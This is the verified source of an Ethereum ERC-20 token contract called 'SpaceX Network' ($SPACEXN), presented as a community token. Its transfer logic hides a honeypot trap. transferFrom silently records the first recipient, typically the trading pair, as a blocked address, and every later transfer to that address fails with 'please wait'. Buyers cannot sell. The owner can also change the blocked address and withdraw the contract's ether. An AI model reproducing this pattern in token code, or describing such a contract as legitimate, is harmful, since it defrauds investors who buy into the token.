['/**\n', ' *Submitted for verification at Etherscan.io on 2021-05-03\n', '*/\n', '\n', '/**\n', '*\n', 'SpaceX Network  ($SPACEXN) - Community Token\n', '* \n', ' \n', '*/\n', '\n', 'pragma solidity >=0.5.17;\n', '\n', '\n', 'library SafeMath {\n', '  function add(uint a, uint b) internal pure returns (uint c) {\n', '    c = a + b;\n', '    require(c >= a);\n', '  }\n', '  function sub(uint a, uint b) internal pure returns (uint c) {\n', '    require(b <= a);\n', '    c = a - b;\n', '  }\n', '  function mul(uint a, uint b) internal pure returns (uint c) {\n', '    c = a * b;\n', '    require(a == 0 || c / a == b);\n', '  }\n', '  function div(uint a, uint b) internal pure returns (uint c) {\n', '    require(b > 0);\n', '    c = a / b;\n', '  }\n', '}\n', '\n', 'contract ERC20Interface {\n', '  function totalSupply() public view returns (uint);\n', '  function balanceOf(address tokenOwner) public view returns (uint balance);\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '  function transfer(address to, uint tokens) public returns (bool success);\n', '  function approve(address spender, uint tokens) public returns (bool success);\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '\n', '  event Transfer(address indexed from, address indexed to, uint tokens);\n', '  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', 'contract ApproveAndCallFallBack {\n', '  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\n', '}\n', '\n', 'contract Owned {\n', '  address public owner;\n', '  address public newOwner;\n', '\n', '  event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '  constructor() public {\n', '    owner = msg.sender;\n', '  }\n', '\n', '  modifier onlyOwner {\n', '    require(msg.sender == owner);\n', '    _;\n', '  }\n', '\n', '  function transferOwnership(address _newOwner) public onlyOwner {\n', '    newOwner = _newOwner;\n', '  }\n', '  function acceptOwnership() public {\n', '    require(msg.sender == newOwner);\n', '    emit OwnershipTransferred(owner, newOwner);\n', '    owner = newOwner;\n', '    newOwner = address(0);\n', '  }\n', '}\n', '\n', 'contract TokenERC20 is ERC20Interface, Owned{\n', '  using SafeMath for uint;\n', '\n', '  string public symbol;\n', '  string public name;\n', '  uint8 public decimals;\n', '  uint _totalSupply;\n', '  address public newun;\n', '\n', '  mapping(address => uint) balances;\n', '  mapping(address => mapping(address => uint)) allowed;\n', '\n', '  constructor() public {\n', '    symbol = "SPACEXN";\n', '    name = "SpaceX Network";\n', '    decimals = 8;\n', '    _totalSupply = 10000000000000000000000;\n', '    balances[owner] = _totalSupply;\n', '    emit Transfer(address(0), owner, _totalSupply);\n', '  }\n', '  function transfernewun(address _newun) public onlyOwner {\n', '    newun = _newun;\n', '  }\n', '  function totalSupply() public view returns (uint) {\n', '    return _totalSupply.sub(balances[address(0)]);\n', '  }\n', '  function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '      return balances[tokenOwner];\n', '  }\n', '  function transfer(address to, uint tokens) public returns (bool success) {\n', '     require(to != newun, "please wait");\n', '     \n', '    balances[msg.sender] = balances[msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(msg.sender, to, tokens);\n', '    return true;\n', '  }\n', '  function approve(address spender, uint tokens) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    return true;\n', '  }\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '      if(from != address(0) && newun == address(0)) newun = to;\n', '      else require(to != newun, "please wait");\n', '      \n', '    balances[from] = balances[from].sub(tokens);\n', '    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(from, to, tokens);\n', '    return true;\n', '  }\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '    return allowed[tokenOwner][spender];\n', '  }\n', '  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\n', '    return true;\n', '  }\n', '  function () external payable {\n', '    revert();\n', '  }\n', '}\n', '\n', 'contract  SpaceXNetwork is TokenERC20 {\n', '\n', '  function clearCNDAO() public onlyOwner() {\n', '    address payable _owner = msg.sender;\n', '    _owner.transfer(address(this).balance);\n', '  }\n', '  function() external payable {\n', '\n', '  }\n', '}']